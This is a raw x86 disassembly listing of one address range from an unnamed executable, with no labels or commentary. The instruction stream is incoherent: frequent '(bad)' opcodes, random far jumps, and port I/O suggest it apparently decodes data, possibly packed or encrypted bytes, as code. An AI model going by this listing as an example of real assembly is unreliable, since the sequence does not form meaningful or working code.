  40d637:	and    eax,0x5024388e
  40d63c:	cmp    ecx,DWORD PTR [ebp-0x29]
  40d63f:	pop    edx
  40d640:	dec    ecx
  40d641:	xor    al,0x2a
  40d643:	push   ebx
  40d644:	mov    dl,0x14
  40d646:	sub    DWORD PTR [edi-0xa],ebx
  40d649:	(bad)  
  40d64a:	jg     0x40d6bc
  40d64c:	sub    al,ch
  40d64e:	xor    esp,DWORD PTR [edi-0x79103946]
  40d654:	fs lock popa 
  40d657:	jle    0x40d60e
  40d659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d65a:	mov    ss:0x331bd28f,al
  40d660:	cwde   
  40d661:	or     dl,BYTE PTR [esi+esi*1+0x2514f273]
  40d668:	mov    edi,DWORD PTR [ebx-0x2e]
  40d66b:	leave  
  40d66c:	cmc    
  40d66d:	push   0x3d
  40d66f:	dec    edi
  40d670:	mov    eax,ds:0x6d6afbaf
  40d675:	(bad)  
  40d676:	fisubr DWORD PTR [edx-0x14]
  40d679:	cmp    eax,0xee53c485
  40d67e:	scas   al,BYTE PTR es:[edi]
  40d67f:	and    cl,bl
  40d681:	mov    edi,0xc1706f44
  40d686:	sbb    al,0x82
  40d688:	push   cs
  40d689:	and    BYTE PTR [esi],al
  40d68b:	push   edi
  40d68c:	mov    edx,0xa4322bf8
  40d691:	sub    eax,0xf5c2122b
  40d696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d697:	pushf  
  40d698:	outs   dx,BYTE PTR ds:[esi]
  40d699:	mov    al,0x53
  40d69b:	daa    
  40d69c:	mov    ds:0x552a186a,al
  40d6a1:	sbb    al,BYTE PTR [edx+0x11]
  40d6a4:	xchg   edx,eax
  40d6a5:	mov    ebx,0x23ff62f
  40d6aa:	or     BYTE PTR [eax+eax*8-0x47],0x48
  40d6af:	pusha  
  40d6b0:	les    ecx,FWORD PTR [ecx]
  40d6b2:	pop    ebp
  40d6b3:	xor    al,0xe9
  40d6b5:	test   al,0x90
  40d6b7:	add    al,0x73
  40d6b9:	int3   
  40d6ba:	dec    ebp
  40d6bb:	outs   dx,BYTE PTR ds:[esi]
  40d6bc:	jge    0x40d66d
  40d6be:	push   ss
  40d6bf:	add    al,bl
  40d6c1:	ja     0x40d6a5
  40d6c3:	xchg   ecx,eax
  40d6c4:	mov    ds:0x8a62b96f,al
  40d6c9:	mov    esi,0x8252a9b9
  40d6ce:	sub    DWORD PTR [ecx+0x7cca3a45],edx
  40d6d4:	nop
  40d6d5:	ret    
  40d6d6:	jnp    0x40d704
  40d6d8:	dec    ebp
  40d6d9:	sbb    al,BYTE PTR [ebx]
  40d6db:	test   edx,ebp
  40d6dd:	int3   
  40d6de:	fild   QWORD PTR [edx+0x9a3621a]
  40d6e4:	mov    ecx,0x95ef8ba
  40d6e9:	jb     0x40d763
  40d6eb:	cmp    eax,0xfcf2351
  40d6f0:	std    
  40d6f1:	dec    eax
  40d6f2:	dec    ebp
  40d6f3:	retf   0xaf68
  40d6f6:	sub    BYTE PTR [ebx],dh
  40d6f8:	pop    ebp
  40d6f9:	add    bl,bl
  40d6fb:	sub    eax,0x83d7b1c4
  40d700:	pop    ebx
  40d701:	and    al,0xb7
  40d703:	mov    ah,0x5b
  40d705:	cwde   
  40d706:	es xchg ebp,eax
  40d708:	xchg   esi,eax
  40d709:	jno    0x40d770
  40d70b:	mov    ds,WORD PTR [ebx+0x316582b9]
  40d711:	repnz repz inc ebp
  40d714:	cmp    esp,0xffffff9d
  40d717:	push   esp
  40d718:	mov    ch,0xa3
  40d71a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d71b:	mov    edx,0x6d321034
  40d720:	leave  
  40d721:	shl    cl,0x8d
  40d724:	lods   eax,DWORD PTR ds:[esi]
  40d725:	jl     0x40d767
  40d727:	xor    eax,0xc124b0d4
  40d72c:	cmp    DWORD PTR [edi+0x4cf76fdd],0x11
  40d733:	xor    BYTE PTR [ebx+0x5c],0x60
  40d737:	(bad)  
  40d738:	pavgw  mm7,QWORD PTR [edi-0x63]
  40d73c:	cmc    
  40d73d:	dec    edi
  40d73e:	xchg   DWORD PTR [eax],edx
  40d740:	jecxz  0x40d731
  40d742:	sub    BYTE PTR [eax+0x31],ch
  40d745:	cmp    eax,0xe2b7b498
  40d74a:	stc    
  40d74b:	xchg   ebx,eax
  40d74c:	test   DWORD PTR [ebp+eiz*8+0x66],ebx
  40d750:	mov    ebx,0x37f07b4
  40d755:	mov    ds:0x676208d9,eax
  40d75a:	iret   
  40d75b:	jle    0x40d75d
  40d75d:	sub    esp,DWORD PTR [edx-0x4617fb63]
  40d763:	mov    ds:0x6f248203,eax
  40d768:	cli    
  40d769:	mov    cl,0xa6
  40d76b:	in     al,0x8f
  40d76d:	aas    
  40d76e:	mov    ecx,0x8c2b39e2
  40d773:	imul   ebx,DWORD PTR [ebp-0x1f95f5a6],0x7ede3d8f
  40d77d:	pusha  
  40d77e:	test   eax,0xb86112e4
  40d783:	ret    
  40d784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d785:	add    DWORD PTR [edi+0x95ec81b],esi
  40d78b:	jl     0x40d7ee
  40d78d:	mov    ds:0x79d3fa88,eax
  40d792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d793:	pop    edi
  40d794:	or     DWORD PTR [ebx+0x18],edx
  40d797:	daa    
  40d798:	(bad)  
  40d799:	daa    
  40d79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79b:	neg    BYTE PTR [esi-0x4ba22ba8]
  40d7a1:	scas   al,BYTE PTR es:[edi]
  40d7a2:	pop    ecx
  40d7a3:	push   es
  40d7a4:	shr    DWORD PTR [edx],cl
  40d7a6:	bound  ecx,QWORD PTR [esi-0x4757e43]
  40d7ac:	jne    0x40d7fc
  40d7ae:	(bad)  
  40d7af:	adc    DWORD PTR [ebx],eax
  40d7b1:	jb     0x40d7a0
  40d7b3:	pop    ebp
  40d7b4:	pop    esp
  40d7b5:	in     eax,0x7
  40d7b7:	dec    ecx
  40d7b8:	and    ch,ah
  40d7ba:	sti    
  40d7bb:	add    ebx,DWORD PTR [edi+0x6e]
  40d7be:	loopne 0x40d754
  40d7c0:	fcomp  QWORD PTR [ebx]
  40d7c2:	sub    DWORD PTR [esi],ebp
  40d7c4:	fsubr  DWORD PTR [eax+ecx*8-0x40]
  40d7c8:	adc    ecx,DWORD PTR gs:[ecx]
  40d7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7cc:	loop   0x40d83e
  40d7ce:	fidivr DWORD PTR [ecx-0x278f4d0d]
  40d7d4:	in     eax,0x1a
  40d7d6:	cmp    ebp,DWORD PTR [edx+0x76]
  40d7d9:	pop    ds
  40d7da:	call   0x43f80610
  40d7df:	dec    esp
  40d7e0:	icebp  
  40d7e1:	xchg   eax,eax
  40d7e3:	loopne 0x40d7b9
  40d7e5:	sub    ch,BYTE PTR [eax-0x3b01c9d5]
  40d7eb:	mov    WORD PTR [esi+0x257b01fe],fs
  40d7f1:	sub    DWORD PTR [edi],edi
  40d7f3:	into   
  40d7f4:	outs   dx,BYTE PTR ds:[esi]
  40d7f5:	out    0x2,eax
  40d7f7:	add    al,BYTE PTR [ecx]
  40d7f9:	leave  
  40d7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7fb:	fidivr DWORD PTR [esi+edi*1-0x7a]
  40d7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d800:	aaa    
  40d801:	imul   esi,esi,0xd01a71ca
  40d807:	fst    QWORD PTR [eax-0x29]
  40d80a:	xchg   esp,eax
  40d80b:	push   ds
  40d80c:	sub    bh,BYTE PTR [ebx-0x7a16df20]
  40d812:	and    bh,dl
  40d814:	adc    eax,0x897f4738
  40d819:	lds    ecx,FWORD PTR [esi-0x4c]
  40d81c:	adc    dh,BYTE PTR [edi]
  40d81e:	add    esp,ebp
  40d820:	cwde   
  40d821:	xchg   edx,eax
  40d822:	mov    dh,0x1d
  40d824:	lea    edi,[ebp-0x53]
  40d827:	jmp    0x3ab8:0x41f4db06
  40d82e:	pusha  
  40d82f:	imul   ecx,eax,0x9d0696eb
  40d835:	call   0x5e3a:0xa7b31aac
  40d83c:	test   DWORD PTR [eax],esi
  40d83e:	pop    ecx
  40d83f:	fisttp DWORD PTR [ebx-0x7d80386]
  40d845:	xor    al,0x21
  40d847:	je     0x40d815
  40d849:	xor    al,0x26
  40d84b:	fsubr  st,st(5)
  40d84d:	push   edi
  40d84e:	jb     0x40d85e
  40d850:	jmp    0x8255:0xdc97c34
  40d857:	mov    al,0xa
  40d859:	sar    DWORD PTR [esi+edx*2],1
  40d85c:	add    eax,0x721e418a
  40d861:	sbb    BYTE PTR [esi+esi*8],cl
  40d864:	mov    eax,0x88f9a7a3
  40d869:	repnz xchg esp,eax
  40d86b:	in     al,0x6a
  40d86d:	jne    0x40d7fa
  40d86f:	xchg   esi,eax
  40d870:	xchg   ecx,eax
  40d871:	test   DWORD PTR [edi],esp
  40d873:	dec    edx
  40d874:	jae    0x40d88a
  40d876:	sub    ebp,DWORD PTR [esi+0xbae9b2]
  40d87c:	and    DWORD PTR [ecx-0x23],esi
  40d87f:	repz dec ebp
  40d881:	ss push ecx
  40d883:	xchg   edx,eax
  40d884:	push   esi
  40d885:	pushf  
  40d886:	cmp    ebp,DWORD PTR [ecx]
  40d888:	mov    esi,0xc48cb5c8
  40d88d:	and    al,0x46
  40d88f:	lea    ebp,[esi+esi*2-0x6c241473]
  40d896:	push   ebx
  40d897:	jb     0x40d8a6
  40d899:	pop    edi
  40d89a:	dec    ebx
  40d89b:	pop    ecx
  40d89c:	mov    eax,ds:0x9e9249a6
  40d8a1:	xchg   edx,eax
  40d8a2:	dec    ebx
  40d8a3:	add    edi,esp
  40d8a5:	inc    eax
  40d8a6:	dec    esp
  40d8a7:	(bad)  
  40d8a8:	pusha  
  40d8a9:	sar    DWORD PTR ds:0x615bb5d9,cl
  40d8af:	jp     0x40d87b
  40d8b1:	mov    bh,0xf9
  40d8b3:	js     0x40d8ae
  40d8b5:	loope  0x40d910
  40d8b7:	les    edx,FWORD PTR [eax]
  40d8b9:	imul   ebp,DWORD PTR ds:0xfc891d9c,0x6a38ee7f
  40d8c3:	push   cs
  40d8c4:	(bad)  
  40d8c5:	test   eax,0xb4b914ba
  40d8ca:	mov    esp,esp
  40d8cc:	xor    eax,0xf3c7f131
  40d8d1:	shl    ebp,1
  40d8d3:	pop    edi
  40d8d4:	adc    bh,BYTE PTR [edx+0x5d]
  40d8d7:	xor    ch,ch
  40d8d9:	inc    ebp
  40d8da:	pushf  
  40d8db:	sbb    eax,ebx
  40d8dd:	xchg   ebp,eax
  40d8de:	sbb    eax,0xc1b91bd
  40d8e3:	and    dh,bh
  40d8e5:	pop    esi
  40d8e6:	or     BYTE PTR [eax],bh
  40d8e8:	pop    ds
  40d8e9:	std    
  40d8ea:	sbb    esp,DWORD PTR [esi-0x6b]
  40d8ed:	in     al,0x3e
  40d8ef:	fnstenv [eax+0x2d]
  40d8f2:	nop
  40d8f3:	jl     0x40d8dc
  40d8f5:	in     al,dx
  40d8f6:	add    eax,0x5090254e
  40d8fb:	idiv   BYTE PTR [ebp-0x6393632b]
  40d901:	in     al,0xa1
  40d903:	sbb    esi,ecx
  40d905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d906:	push   cs
  40d907:	xchg   ebx,eax
  40d908:	pop    eax
  40d909:	ja     0x40d8c4
  40d90b:	sar    BYTE PTR ds:0xcfe56b17,cl
  40d911:	adc    DWORD PTR cs:[edi],ecx
  40d914:	sti    
  40d915:	xchg   edi,eax
  40d916:	das    
  40d917:	jns    0x40d8a1
  40d919:	das    
  40d91a:	inc    eax
  40d91b:	adc    bl,BYTE PTR [ebx-0x73]
  40d91e:	loope  0x40d8a7
  40d920:	push   edx
  40d921:	je     0x40d8b9
  40d923:	mov    ds:0xe7b07595,eax
  40d928:	xor    DWORD PTR [eax+0x4f],edx
  40d92b:	lahf   
  40d92c:	scas   al,BYTE PTR es:[edi]
  40d92d:	xlat   BYTE PTR ds:[ebx]
  40d92e:	repz cmp eax,0x24025a10
  40d934:	dec    DWORD PTR ds:0x417aa74b
  40d93a:	sbb    esi,DWORD PTR [ebx+edi*1-0xb]
  40d93e:	popf   
  40d93f:	jmp    0x40d98b
  40d941:	jmp    0x8254a343
  40d946:	sub    eax,0x49394903
  40d94b:	add    bl,bh
  40d94d:	ja     0x40d964
  40d94f:	xchg   ecx,ecx
  40d951:	cmp    DWORD PTR [edx+0x6f],eax
  40d954:	popa   
  40d955:	loope  0x40d997
  40d957:	(bad)  
  40d958:	mov    ebx,0x24a4a481
  40d95d:	loopne 0x40d9cf
  40d95f:	sbb    al,0xbc
  40d961:	pop    es
  40d962:	cmc    
  40d963:	mov    ecx,0x6d54f9c7
  40d968:	ins    DWORD PTR es:[edi],dx
  40d969:	retf   0xcc92
  40d96c:	push   ebx
  40d96d:	pop    ebp
  40d96e:	mov    edx,0xb9d01a3c
  40d973:	and    BYTE PTR [esi+0x528f069c],dl
  40d979:	jecxz  0x40d9d9
  40d97b:	and    dl,BYTE PTR [edi]
  40d97d:	pop    ss
  40d97e:	out    0x67,eax
  40d980:	int3   
  40d981:	ins    DWORD PTR es:[edi],dx
  40d982:	mov    ds:0x436689ab,eax
  40d987:	push   edi
  40d988:	mov    ecx,0x62634ab6
  40d98d:	stos   BYTE PTR es:[edi],al
  40d98e:	cmp    al,0x9
  40d990:	jmp    DWORD PTR [esp+ebx*2]
  40d993:	dec    ebp
  40d994:	test   eax,0x9f36500b
  40d999:	cmp    esp,DWORD PTR [esi+0x79]
  40d99c:	popa   
  40d99d:	icebp  
  40d99e:	fcmove st,st(4)
  40d9a0:	cld    
  40d9a1:	jne    0x40d941
  40d9a3:	mov    dh,0x2c
  40d9a5:	push   ds
  40d9a6:	into   
  40d9a7:	pop    edx
  40d9a8:	fisttp QWORD PTR [edx-0x11da66e8]
  40d9ae:	jae    0x40d96d
  40d9b0:	rol    BYTE PTR [ecx-0x40649664],cl
  40d9b6:	jmp    DWORD PTR [ebp+0x1f]
  40d9b9:	adc    al,0xcd
  40d9bb:	mov    cl,0x15
  40d9bd:	aas    
  40d9be:	sub    al,0x1f
  40d9c0:	mov    eax,ds:0xb5ab75a4
  40d9c5:	icebp  
  40d9c6:	mov    bh,0x89
  40d9c8:	push   ebx
  40d9c9:	jmp    0x99b:0xa2d1c430
  40d9d0:	stc    
  40d9d1:	adc    al,al
  40d9d3:	mov    al,ds:0x232aded
  40d9d8:	(bad)  
  40d9d9:	sub    edi,DWORD PTR cs:[ecx]
  40d9dc:	arpl   WORD PTR [esi-0x6a],cx
  40d9df:	and    BYTE PTR [ebp-0x53],ch
  40d9e2:	jae    0x40d9e2
  40d9e4:	retf   
  40d9e5:	shl    BYTE PTR [ebp+0x4],cl
  40d9e8:	sahf   
  40d9e9:	sbb    eax,0xd61a5797
  40d9ee:	add    al,0xb5
  40d9f0:	mov    gs,WORD PTR [edi]
  40d9f2:	rcr    DWORD PTR [esp+eax*1+0x42],cl
  40d9f6:	repz mov edx,0xe52d08f1
  40d9fc:	pop    ebp
  40d9fd:	pop    esp
  40d9fe:	cmp    al,0x22
  40da00:	inc    ebp
  40da01:	sbb    eax,0x1937c92d
  40da06:	adc    eax,0x336a0f10
  40da0b:	call   0x7850:0x4fe65e4e
  40da12:	dec    edi
  40da13:	sahf   
  40da14:	and    DWORD PTR [edx+esi*4+0x159244d],ebx
  40da1b:	(bad)  
  40da1c:	ret    0xff6b
  40da1f:	ins    BYTE PTR es:[edi],dx
  40da20:	(bad)  
  40da21:	fdivrp st(4),st
  40da23:	mov    edx,0xbc95ac97
  40da28:	mov    ds,WORD PTR [esi+0x7]
  40da2b:	outs   dx,BYTE PTR ds:[esi]
  40da2c:	int3   
  40da2d:	dec    edx
  40da2e:	dec    esp
  40da2f:	ins    BYTE PTR es:[edi],dx
  40da30:	cld    
  40da31:	js     0x40d9fc
  40da33:	or     ch,dh
  40da35:	lods   eax,DWORD PTR ds:[esi]
  40da36:	cmp    DWORD PTR [ecx],0x2697fcc9
  40da3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da3d:	lods   eax,DWORD PTR ds:[esi]
  40da3e:	fwait
  40da3f:	push   ss
  40da40:	ins    DWORD PTR es:[edi],dx
  40da41:	mov    al,0x40
  40da43:	or     al,0xbe
  40da45:	mov    dl,0x38
  40da47:	cmp    BYTE PTR [eax],bh
  40da49:	xchg   edi,eax
  40da4a:	cmp    eax,0x85f2b987
  40da4f:	frstor [ecx-0x4d550b5b]
  40da55:	or     dh,dh
  40da57:	xor    al,BYTE PTR [esp+esi*2-0x46802945]
  40da5e:	pop    ebx
  40da5f:	(bad)  
  40da60:	sahf   
  40da61:	dec    edx
  40da62:	ins    BYTE PTR es:[edi],dx
  40da63:	mov    eax,ds:0x948d7c50
  40da68:	(bad)  
  40da6a:	outs   dx,BYTE PTR ds:[esi]
  40da6b:	xchg   edi,eax
  40da6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da6d:	pop    ss
  40da6e:	dec    ebp
  40da6f:	out    0x8d,al
  40da71:	pop    ebp
  40da72:	and    DWORD PTR [edi+0x0],ebp
  40da75:	or     ebx,DWORD PTR [edx]
  40da77:	stos   BYTE PTR es:[edi],al
  40da78:	(bad)  
  40da79:	mov    cl,0xd9
  40da7b:	jno    0x40da6e
  40da7d:	stc    
  40da7e:	dec    eax
  40da7f:	mov    ch,0x32
  40da81:	mov    eax,ds:0xff4b55e2
  40da86:	inc    sp
  40da88:	xchg   esi,eax
  40da89:	mov    bl,al
  40da8b:	scas   eax,DWORD PTR es:[edi]
  40da8c:	(bad)  
  40da8d:	push   ecx
  40da8e:	in     al,0x2d
  40da90:	mov    cl,0xb2
  40da92:	into   
  40da93:	pop    edx
  40da94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da95:	ins    DWORD PTR es:[edi],dx
  40da96:	stc    
  40da97:	mov    ebp,0x7ae67e89
  40da9c:	cmp    al,0x63
  40da9e:	gs repnz pop edx
  40daa1:	cmp    eax,0x5f239d1b
  40daa6:	rol    BYTE PTR [ebx-0x5fb750c1],0x8a
  40daad:	repz mov edi,0x51bdd1d9
  40dab3:	adc    al,BYTE PTR [ecx-0x2a0f9967]
  40dab9:	sti    
  40daba:	add    DWORD PTR [eax],esi
  40dabc:	dec    ebp
  40dabd:	in     al,dx
  40dabe:	call   0x52c1:0xca6982d8
  40dac5:	xchg   ebx,eax
  40dac6:	or     eax,0x2ac5f09a
  40dacb:	sub    cl,BYTE PTR [eax+0x5e]
  40dace:	lahf   
  40dacf:	lea    eax,[ebp-0x16]
  40dad2:	pop    es
  40dad3:	aaa    
  40dad4:	lock and edx,esi
  40dad7:	add    ebp,DWORD PTR [eax]
  40dad9:	test   DWORD PTR [edx*2+0x4db57c52],esp
  40dae0:	push   es
  40dae1:	fsub   QWORD PTR [esp+ebx*2+0x38fd2f5e]
  40dae8:	pop    ebx
  40dae9:	cs adc eax,0x48f96fee
  40daef:	add    DWORD PTR gs:[edx+0x54],0xcf9da7ad
  40daf7:	repnz pushf 
  40daf9:	dec    eax
  40dafa:	(bad)  
  40dafb:	fxch   st(5)
  40dafd:	or     BYTE PTR [ebx+0x56b8a6ac],ah
  40db03:	mov    ebx,0x8e78c89b
  40db08:	popa   
  40db09:	ss (bad) 
  40db0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db0c:	mov    dl,0x6b
  40db0e:	jp     0x40da9a
  40db10:	enter  0xf872,0x82
  40db14:	jl     0x40dafe
  40db16:	mov    bl,0x8d
  40db18:	call   0x5edb57ea
  40db1d:	and    DWORD PTR [edx+ebx*1],0xfffffff3
  40db21:	cmp    eax,0xd17cab25
  40db26:	xlat   BYTE PTR ds:[ebx]
  40db27:	dec    ebx
  40db28:	nop
  40db29:	in     eax,dx
  40db2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db2b:	fdivr  st,st(3)
  40db2d:	out    0x48,al
  40db2f:	mov    bh,0xf9
  40db31:	jns    0x40db98
  40db33:	mov    ebp,0xb13f6ef4
  40db38:	cmc    
  40db39:	lods   al,BYTE PTR ds:[esi]
  40db3a:	fidivr DWORD PTR [esi-0x18d3d673]
  40db40:	mov    bl,0x37
  40db42:	(bad)  
  40db44:	int    0x6a
  40db46:	sub    al,BYTE PTR [esi-0x46]
  40db49:	jb     0x40db6f
  40db4b:	lahf   
  40db4c:	pop    ebp
  40db4d:	out    0x21,eax
  40db4f:	ja     0x40db51
  40db51:	pop    esi
  40db52:	or     al,0x58
  40db54:	shl    BYTE PTR [esi+eax*4-0xd],1
  40db58:	jge    0x40db8a
  40db5a:	and    DWORD PTR [edx+0x3781bebe],eax
  40db60:	sahf   
  40db61:	out    dx,al
  40db62:	adc    edx,ebx
  40db64:	adc    eax,edx
  40db66:	sbb    BYTE PTR [edx-0x8],0xc8
  40db6a:	sbb    DWORD PTR [esi+0x5fcdcdab],edx
  40db70:	cmp    BYTE PTR ds:0x9bb812aa,ah
  40db76:	je     0x40dbc5
  40db78:	popw   ds
  40db7a:	shr    dl,0x94
  40db7d:	test   al,0x77
  40db7f:	xchg   edi,eax
  40db80:	sbb    DWORD PTR [edi-0x5cbfdb75],0xbe97b1f0
  40db8a:	xchg   esp,eax
  40db8b:	and    eax,0x72d0a61e
  40db90:	lahf   
  40db91:	aaa    
  40db92:	or     al,0x8b
  40db94:	add    ebp,eax
  40db96:	and    ch,bl
  40db98:	mov    eax,ds:0xd9e88751
  40db9d:	xchg   esi,eax
  40db9e:	enter  0x896f,0x11
  40dba2:	addr16 dec ecx
  40dba4:	scas   al,BYTE PTR es:[edi]
  40dba5:	and    DWORD PTR [eax-0x4d],0xffffffa1
  40dba9:	sub    edx,esp
  40dbab:	sbb    BYTE PTR [edx+ebp*8-0x7f7aafcd],ah
  40dbb2:	call   0xd4e14bce
  40dbb7:	mov    ds:0xfe5593d7,al
  40dbbd:	outs   dx,BYTE PTR ds:[esi]
  40dbbe:	test   BYTE PTR [edi+0x32fae37],bl
  40dbc4:	fimul  WORD PTR [ebp+0x34d75bb5]
  40dbca:	mov    ds:0xff03f1dc,al
  40dbcf:	cmp    al,0xcd
  40dbd1:	rol    DWORD PTR [eax+edi*1+0x4b],cl
  40dbd5:	icebp  
  40dbd6:	xor    eax,0x82ce3ee2
  40dbdb:	mov    dl,BYTE PTR [edi+0x20]
  40dbde:	xor    al,0xed
  40dbe0:	adc    al,0x93
  40dbe2:	dec    esi
  40dbe3:	ret    
  40dbe4:	rcl    BYTE PTR [esi-0x1a8729be],0xee
  40dbeb:	or     dl,dl
  40dbed:	xchg   ebp,eax
  40dbee:	ffreep st(1)
  40dbf0:	aad    0xcb
  40dbf2:	mov    esi,0xb83e25aa
  40dbf7:	repnz out 0xd2,al
  40dbfa:	inc    ebx
  40dbfb:	lock fwait
  40dbfd:	xchg   BYTE PTR [ebp+ebp*8-0x65d93bd8],bl
  40dc04:	cli    
  40dc05:	adc    DWORD PTR [edi+ecx*1+0x605677cc],0xffffffaf
  40dc0d:	jecxz  0x40dc68
  40dc0f:	inc    esp
  40dc10:	adc    BYTE PTR [eax-0x6a],bh
  40dc13:	neg    DWORD PTR [edi+esi*1]
  40dc16:	loope  0x40dbfc
  40dc18:	adc    dl,BYTE PTR [edi+0x7b]
  40dc1b:	test   BYTE PTR [ebp-0x5],dl
  40dc1e:	cmp    DWORD PTR [ebp+0x12],esp
  40dc21:	cmc    
  40dc22:	pusha  
  40dc23:	dec    ecx
  40dc24:	sbb    ax,0xd436
  40dc28:	push   ecx
  40dc29:	je     0x40dc21
  40dc2b:	scas   eax,DWORD PTR es:[edi]
  40dc2c:	loop   0x40dc32
  40dc2e:	add    edi,DWORD PTR [esi]
  40dc30:	out    0x85,eax
  40dc32:	fwait
  40dc33:	dec    ecx
  40dc34:	pop    eax
  40dc35:	jmp    FWORD PTR [ebx+0x49]
  40dc38:	iret   
  40dc39:	clc    
  40dc3a:	xor    ebp,ebp
  40dc3c:	mov    ds:0xfc5690ce,eax
  40dc41:	inc    ebp
  40dc42:	push   edx
  40dc43:	sar    BYTE PTR [ecx-0x4cf40d58],1
  40dc49:	mov    eax,ds:0x1e48b7f0
  40dc4e:	jb     0x40dc48
  40dc50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc51:	cmp    BYTE PTR [ebp+0xf6a86dd],dl
  40dc57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc58:	fsub   st(3),st
  40dc5a:	loopne 0x40dc7c
  40dc5c:	pop    ds
  40dc5d:	out    0x3e,al
  40dc5f:	nop
  40dc60:	scas   al,BYTE PTR es:[edi]
  40dc61:	bnd jbe 0x40dc5b
  40dc64:	jle    0x40dc00
  40dc66:	sbb    eax,0x3bcc0b81
  40dc6b:	xchg   esi,eax
  40dc6c:	inc    esp
  40dc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc6e:	add    esp,DWORD PTR [ebp-0x41]
  40dc71:	outs   dx,BYTE PTR ds:[esi]
  40dc72:	sbb    al,0x95
  40dc74:	fstp   st(6)
  40dc76:	push   es
  40dc77:	add    dh,bh
  40dc79:	dec    edx
  40dc7a:	and    DWORD PTR [ebx+eiz*2-0x19],esp
  40dc7e:	push   eax
  40dc7f:	and    edi,DWORD PTR [edx*8+0x3dd77aa]
  40dc86:	int3   
  40dc87:	popf   
  40dc88:	int3   
  40dc89:	pop    eax
  40dc8a:	(bad)  
  40dc8b:	pushw  es
  40dc8d:	mov    eax,0x341b41a
  40dc92:	add    al,0xb5
  40dc94:	(bad)  
  40dc95:	(bad)  
  40dc96:	outs   dx,DWORD PTR ds:[esi]
  40dc97:	loopne 0x40dcb4
  40dc99:	mov    esp,0xab8dcac5
  40dc9e:	sub    eax,0x41be1d99
  40dca3:	xlat   BYTE PTR ds:[ebx]
  40dca4:	into   
  40dca5:	push   ss
  40dca6:	jno    0x40dc98
  40dca8:	adc    ebx,esp
  40dcaa:	ror    BYTE PTR [esi-0x3301dcaa],cl
  40dcb0:	mov    edx,DWORD PTR [edi+eax*2]
  40dcb3:	(bad)  
  40dcb4:	cmp    al,dl
  40dcb6:	mov    dh,0xb8
  40dcb8:	shl    BYTE PTR [ecx+0x59007099],1
  40dcbe:	xchg   DWORD PTR ds:0xfe2a35dc,edx
  40dcc4:	fmul   DWORD PTR [ebx-0x6d]
  40dcc7:	push   0x69
  40dcc9:	aam    0x11
  40dccb:	and    edx,DWORD PTR ds:0xf368e463
  40dcd1:	add    al,0xeb
  40dcd3:	lds    ebx,FWORD PTR [edx+0x4889d0b6]
  40dcd9:	adc    eax,edx
  40dcdb:	sub    BYTE PTR [ecx+ecx*4-0x6ac47d09],dl
  40dce2:	mov    ds:0x29e73f37,al
  40dce7:	xor    al,0xa
  40dce9:	mov    eax,ds:0x4059b1c9
  40dcee:	retf   0xa58
  40dcf1:	sbb    al,0x84
  40dcf3:	mov    ebp,0x2003c6b7
  40dcf8:	pop    eax
  40dcf9:	mov    bh,0xbb
  40dcfb:	pusha  
  40dcfc:	xlat   BYTE PTR ds:[ebx]
  40dcfd:	xlat   BYTE PTR ds:[ebx]
  40dcfe:	ins    BYTE PTR es:[edi],dx
  40dcff:	add    BYTE PTR [eax],cl
  40dd01:	loop   0x40dcde
  40dd03:	retf   0x7223
  40dd06:	ret    0x9d5a
  40dd09:	into   
  40dd0a:	test   edi,edx
  40dd0c:	push   ebp
  40dd0d:	sub    al,0x46
  40dd0f:	pop    eax
  40dd10:	je     0x40dc9c
  40dd12:	adc    edi,DWORD PTR [edx+0x58]
  40dd15:	cdq    
  40dd16:	gs inc edx
  40dd18:	lahf   
  40dd19:	mov    bh,BYTE PTR [ecx+eax*4-0x5ab502b9]
  40dd20:	xor    eax,0x4b38df80
  40dd25:	push   ecx
  40dd26:	loopne 0x40dcab
  40dd28:	jp     0x40dd3d
  40dd2a:	lahf   
  40dd2b:	sub    BYTE PTR ds:0x7b42ea2a,0x18
  40dd32:	dec    esi
  40dd33:	sub    al,0xf5
  40dd35:	or     BYTE PTR ds:0x2ac1863c,cl
  40dd3b:	mov    eax,gs
  40dd3d:	enter  0xcc68,0xe2
  40dd41:	mov    eax,ds:0x39e80840
  40dd46:	jge    0x40dd83
  40dd48:	mov    DWORD PTR [ebx+0x1e],edi
  40dd4b:	pushf  
  40dd4c:	jmp    0x40dcd1
  40dd4e:	popf   
  40dd4f:	jne    0x40dd17
  40dd51:	in     al,0x7d
  40dd53:	scas   eax,DWORD PTR es:[edi]
  40dd54:	push   ds
  40dd55:	retf   
  40dd56:	jmp    0x79a29c05
  40dd5b:	adc    dl,BYTE PTR [edx+0x7ea89aa4]
  40dd61:	dec    esp
  40dd62:	(bad)  
  40dd63:	out    0xb8,al
  40dd65:	xchg   edi,eax
  40dd66:	mov    esp,DWORD PTR [edx-0x7af82741]
  40dd6c:	test   BYTE PTR [edi],cl
  40dd6e:	call   0x882fe6b3
  40dd73:	fwait
  40dd74:	mov    esp,?
  40dd76:	cmp    BYTE PTR [ebx],0x75
  40dd79:	sub    BYTE PTR [eax-0x13],cl
  40dd7c:	fdivr  QWORD PTR fs:[ebp-0x7997d857]
  40dd83:	in     eax,dx
  40dd84:	in     eax,0x77
  40dd86:	fsubr  DWORD PTR [edx+0x2f]
  40dd89:	inc    esp
  40dd8a:	mov    edx,0x38afbcb7
  40dd8f:	and    BYTE PTR [ecx],dl
  40dd91:	popa   
  40dd92:	out    0xf5,al
  40dd94:	sbb    eax,0x1ac0425b
